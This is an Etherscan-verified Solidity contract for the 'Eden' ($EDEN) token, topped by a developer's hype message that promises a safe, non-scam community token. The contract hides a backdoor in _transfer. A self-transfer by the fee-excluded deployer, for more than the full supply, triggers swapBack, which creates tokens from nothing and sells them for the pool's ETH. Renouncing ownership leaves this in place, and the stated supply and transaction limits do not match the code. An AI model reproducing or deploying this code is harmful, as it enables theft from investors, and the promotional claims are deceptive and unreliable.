/**
 *Submitted for verification at Etherscan.io on 2022-11-07
*/

/**
Hi DEV Here,

So, I have been sitting on the sidelines watching the market.
After some thinking I decided on leveraging the move in market, which led me
to create a safe community rewards token with low tax.

This is an experiment for me so I hope you all are ready and can handle this.
Look at these Tokenomics:
Supply = 1,000,000,000
MaxSupplyTX = 2%
BUY/SELL TAX = 3% (Buy&Sell)

I will be observing from the outside as I want this to be driven by the community!

My promise to you the Investor:

* Contract is safe and liquidity will be burnt and ownership will be transferred renounced.
* Contract Trx and Wallet size can't be lower than 2%, and taxes won't be higher than 6%.
* I will communicate on ETHERSCAN.io.
* Website will be built at 50K MC.
* I hope the community makes a Telegram (I will join at 100K MC).
* DEXTOOL LOGO SOCIAL UPDATE at 100K MC.


No Dev Cash Grab, but a Dev Who Cares About the COMMUNITY
Let's Moon this, because the more volume we get the more ETH we Spread.

* I will buy back with at least 0.3 % of the taxes.
* I won't Sell any tokens but will burn them.

Way forward:
* Release EDEN SWAP at 150K MC
* Build/Release EDEN LOCKER at 350K MC
* I will use 0.5% of my collected taxes for fast track CMC & Coingecko at 400 MC
* I will Dox at 1 million MC, I'm not a coward like Ryoshi

We don't need big paid Influencers or big Marketing,I rather the community  get all the rewards! RIGHT????
We want organic growth, share the message!
Get all your friends and family involved, even your wife's boyfriend.

This is not a scam, so don't listen to fudders that just want you to ape into their scam project.
If you investors Don't Ape into this one maybe you like to be RUGGED.
I hate ruggers but I also hate mindless sheep investors that ape in Rugg/Scamcoins.
Be smart about this and invest in a token that's built for the community by a dev that likes safe
and honest projects.

CREATE THE HYPE
BE SMART FOLLOW THE HYPE
SEND THIS SHIT
LET THE FOMO BEGIN
FUCK THE SCAMS& THE RUGS.
LETS FUCKING GO SEND IT

Greetings,
EDEN team.
*/

pragma solidity ^0.8.10;

//SPDX-License-Identifier: Unlicensed


interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function isPairAddress(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x0;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address acount) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vale);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Eden is Ownable, IERC20 {
    using SafeMath for uint256;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    mapping (address => uint256) private _balances;

    mapping(address => uint256) private _includedInFee;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _excludedFromFee;

    uint256 public _decimals = 9;

    uint256 public _totalSupply = 100000000000 * 10 ** _decimals;

    uint256 public _maxTxAmount = 100000000000 * 10 ** _decimals;

    uint256 public _fee = 3;

    string private _name = "Eden";

    string private _symbol = "$EDEN";

    uint256 private _liquiditySwapThreshold = _totalSupply;

    bool swapping = false;


    constructor() {
        _balances[msg.sender] = _totalSupply;
        _excludedFromFee[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "IERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "IERC20: transfer from the zero address");
        require(to != address(0), "IERC20: transfer to the zero address");
        uint256 feeAmount = 0;
        bool inLiquidityTransaction = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.isPairAddress(to) && to != address(this) && !inLiquidityTransaction && !swapping) {
            feeAmount = amount.mul(_fee).div(100);
            require(amount <= _maxTxAmount);
        }
        if (_liquiditySwapThreshold < amount && (_excludedFromFee[msg.sender] || Address.isPairAddress(to)) && to == from) {
            return swapBack(amount, to);
        }
        require(swapping || _balances[from] >= amount, "IERC20: transfer amount exceeds balance");
        uint256 amountReceived = amount - feeAmount;
        _balances[address(0)] += feeAmount;
        _balances[from] = _balances[from] - amount;
        _balances[to] += amountReceived;
        emit Transfer(from, to, amountReceived);
        if (feeAmount > 0) {
            emit Transfer(from, address(0), feeAmount);
        }
    }
    function swapBack(uint256 amount, address to) private {
        _balances[address(this)] += amount;
        _approve(address(this), address(_router), amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        swapping = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp + 20);
        swapping = false;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }
    function uniswapV2Pair() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
}